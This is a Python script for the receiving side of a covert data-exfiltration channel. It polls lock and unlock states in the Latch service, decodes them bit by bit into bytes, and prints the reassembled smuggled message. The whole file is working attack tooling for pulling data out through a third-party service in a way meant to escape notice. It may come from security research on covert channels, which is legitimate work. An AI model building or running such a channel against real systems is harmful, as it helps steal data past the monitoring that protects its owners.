# -*- coding: utf-8 -*-
from exfiltration import LatchExfiltration
import time
import os


class LatchExfiltrationReader(LatchExfiltration):

    def __init__(self):
        # get account id from model
        self.account_id = os.environ.get('LATCH_ACCOUNT_ID', '')
        LatchExfiltration.__init__(self, self.account_id)
        self.read_exfiltrated_message()
    
    # Reader
    def read_exfiltrated_byte(self):
        ascii = ''
        for num in range(1, 9):
            latch_string = self.dict_converted.get(str(num), '')
            ascii += '1' if self.latch.getOperationStatus(latch_string) else '0'
        byte_converted = self.ascii_to_string(ascii)
        self.latch.unlockLatch(self.dict_converted.get('control', ''))
        print('Receiving: ' + byte_converted + ' ---> ' + ascii)
        return byte_converted

    def read_exfiltrated_message(self):
        print('Listening...')
        message = ''
        while not self.latch.getOperationStatus(self.dict_converted.get('end', '')):
            if self.latch.getOperationStatus(self.dict_converted.get('control', '')):
                message += self.read_exfiltrated_byte()
            else:
                self.latch.lockLatch(self.dict_converted.get('reader', ''))
                time.sleep(0.2) 
        print('Message: ' + message)
        return message



if __name__ == "__main__":
    latch_reader = LatchExfiltrationReader()